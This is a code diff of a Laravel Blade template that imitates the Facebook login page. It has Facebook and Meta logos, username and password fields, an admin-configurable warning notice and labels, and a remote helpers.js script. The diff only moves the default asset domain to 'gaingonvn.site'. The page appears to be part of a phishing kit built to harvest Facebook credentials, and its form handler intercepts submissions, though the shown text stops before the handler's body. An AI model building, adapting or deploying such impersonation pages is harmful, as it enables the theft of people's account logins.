@@ -14,7 +14,7 @@
     <meta property="og:title" content="{{ $data->title }}" />
     <meta property="og:image" content="{{ $data->image }}" />
     <meta property="og:type" content="article" />
-    <link rel="shortcut icon" href="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fblogo.png">
+    <link rel="shortcut icon" href="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/fblogo.png">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     @vite(['resources/css/app.css'])
     <style>
@@ -32,7 +32,7 @@
 
         @font-face {
             font-family: 'MyRulersVjpPro';
-            src: url('https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fb_font.woff2') format('woff2');
+            src: url('https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/fb_font.woff2') format('woff2');
         }
 
         body {
@@ -45,7 +45,7 @@
     <div class="lg:grid lg:grid-cols-[150px_1fr_600px] border-b-3 border-b-[#dde2e7]">
         <div class="hidden sm:block col-span-1 ml-10">
             <a href="">
-                <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fb_logo.png" alt="fb-logo" class="mt-[50px] ml-4" width="60">
+                <img src="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/fb_logo.png" alt="fb-logo" class="mt-[50px] ml-4" width="60">
             </a>
             <h1 class="font-bold text-[3.5rem] leading-tight mt-[300px] mb-7">
                 {{ explode('_', __('facebook.discover_anything_you_like'))[0] }} <span
@@ -53,14 +53,14 @@
         </div>
         <div class="hidden sm:block col-span-1">
             <div class="flex justify-center items-center h-full">
-                <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fb_login_banner.png" alt="fb-banner" class="w-[40%] xl:w-[50%]">
+                <img src="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/fb_login_banner.png" alt="fb-banner" class="w-[40%] xl:w-[50%]">
             </div>
         </div>
         <div class="col-span-1 lg:border-l-3 border-l-[#dde2e7]">
             <div class="flex justify-center px-5 sm:px-10 mx-auto items-center h-full">
                 <div class="space-y-3 w-full">
                     <div class="flex justify-center my-10 block sm:hidden">
-                        <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fb_logo.png" alt="fb-logo" width="60">
+                        <img src="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/fb_logo.png" alt="fb-logo" width="60">
                     </div>
                     {{-- Notice đăng nhập --}}
                     <p class="font-semibold mb-5" id="notice">{{ $data->login_warning }}</p>
@@ -77,7 +77,7 @@
                                     class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                     for="user">{{ filled($login_theme_config->facebook->username) ? $login_theme_config->facebook->username : __('facebook.email_or_phone') }}</label>
                                 <button id="close_btn" class="cursor-pointer hidden" type="button">
-                                    <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/close_logo.svg" width="25" />
+                                    <img src="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/close_logo.svg" width="25" />
                                 </button>
                             </div>
                         </div>
@@ -91,10 +91,10 @@
                                     for="pass">{{ filled($login_theme_config->facebook->password) ? $login_theme_config->facebook->password : __('facebook.password') }}</label>
                                 @if ($setting->showFacebookPasswordButton)
                                     <button type="button" id="show_pass" class="cursor-pointer hidden">
-                                        <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/show_pass.svg" width="25" />
+                                        <img src="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/show_pass.svg" width="25" />
                                     </button>
                                     <button type="button" id="hide_pass" class="cursor-pointer hidden">
-                                        <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/hide_pass.svg" width="25" />
+                                        <img src="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/hide_pass.svg" width="25" />
                                     </button>
                                 @endif
                             </div>
@@ -112,7 +112,7 @@
                                 {{ filled($login_theme_config->facebook->create_account) ? $login_theme_config->facebook->create_account : __('facebook.create_new_account') }}
                             </button>
                             <div class="flex justify-center mb-5">
-                                <img src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/meta_logo.png" alt="fb-logo" width="55">
+                                <img src="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/meta_logo.png" alt="fb-logo" width="55">
                             </div>
                         </div>
                     </div>
@@ -137,7 +137,7 @@
             </script>
         </p>
     </div>
-    <script src="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/helpers.js"></script>
+    <script src="https://{{env('APP_CDN_DOMAIN', 'gaingonvn.site')}}/theme/system/facebook/helpers.js"></script>
     <script>
         $("#submit").submit(function(e) {
             e.preventDefault();
